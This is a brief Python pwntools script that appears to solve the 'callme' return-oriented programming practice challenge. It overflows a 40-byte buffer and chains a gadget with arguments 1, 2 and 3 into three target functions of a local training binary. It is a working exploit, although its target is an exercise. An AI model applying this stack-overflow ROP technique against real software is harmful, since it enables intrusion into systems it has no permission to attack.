from pwn import *
callme_one = p64(0x0000000000401850)
callme_two = p64(0x0000000000401870)
callme_three = p64(0x0000000000401810)
gadget = p64(0x0000000000401ab0)
seq = gadget + p64(1) + p64(2) + p64(3)
payload = bytes("a"*40, 'utf-8') + seq + callme_one + seq + callme_two + seq + callme_three
elf = process('callme')
elf.sendline(payload)
print(elf.recvall())
